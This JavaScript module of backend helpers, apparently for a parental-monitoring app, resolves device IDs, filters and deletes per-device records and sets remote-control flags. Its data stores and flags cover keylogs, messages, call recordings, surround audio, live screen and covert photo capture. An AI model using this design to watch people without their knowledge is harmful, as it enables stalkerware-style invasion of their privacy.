/** Per-device telemetry helpers */

export const defaultRemoteControlState = () => ({
  screenTimeLimit: "No limit",
  isDeviceLocked: false,
  blockedApps: ["Roblox"],
  screenshotPending: false,
  surroundRecordPending: false,
  recordScreenPending: false,
  liveScreenPending: false,
  takePhotoPending: false,
  recordVideoPending: false,
  gallerySyncPending: false,
  historicalSyncPending: false
});

/** Child uploads: header X-Device-Id or body.deviceId */
export function resolveUploadDeviceId(req, boundDevices) {
  const raw =
    req.headers["x-device-id"] ||
    req.headers["X-Device-Id"] ||
    req.body?.deviceId;
  if (!raw || typeof raw !== "string") return null;
  const deviceId = raw.trim();
  if (!boundDevices.some((d) => d.id === deviceId)) return null;
  return deviceId;
}

/** Parent reads: ?deviceId= */
export function resolveQueryDeviceId(req, boundDevices) {
  const raw = req.query?.deviceId;
  if (!raw || typeof raw !== "string") return null;
  const deviceId = raw.trim();
  if (!boundDevices.some((d) => d.id === deviceId)) return null;
  return deviceId;
}

/** When only one device is bound, records without deviceId (pre-migration) still match. */
export function filterByDevice(arr, deviceId, boundDeviceCount = 1) {
  if (!deviceId) return [];
  const allowLegacy = boundDeviceCount === 1;
  return arr.filter((item) => {
    if (item.deviceId === deviceId) return true;
    if (allowLegacy && !item.deviceId) return true;
    return false;
  });
}

export function removeRecordsForDevice(store, deviceId) {
  let removed = 0;
  for (let i = store.length - 1; i >= 0; i--) {
    if (store[i].deviceId === deviceId) {
      store.splice(i, 1);
      removed++;
    }
  }
  return removed;
}

export function clearAllDeviceStores(stores, deviceId, remoteControlByDevice, geofenceStateByDevice) {
  const names = [
    "realLocations",
    "realCallLogs",
    "realMessages",
    "realSocialChats",
    "realAppCalls",
    "realContacts",
    "realUsageStats",
    "realInstalledApps",
    "realNotifications",
    "realBrowserHistory",
    "realWifiLogs",
    "realSafetyAlerts",
    "realPhotos",
    "realKeylogs",
    "realCalendarEvents",
    "realGeofenceEvents",
    "realKeywordAlerts",
    "realCallRecordings"
  ];
  let total = 0;
  for (const key of names) {
    if (stores[key]) total += removeRecordsForDevice(stores[key], deviceId);
  }
  remoteControlByDevice.delete(deviceId);
  delete geofenceStateByDevice[deviceId];
  return total;
}

export function getRemoteControlForDevice(remoteControlByDevice, deviceId) {
  if (!remoteControlByDevice.has(deviceId)) {
    remoteControlByDevice.set(deviceId, defaultRemoteControlState());
  }
  return remoteControlByDevice.get(deviceId);
}
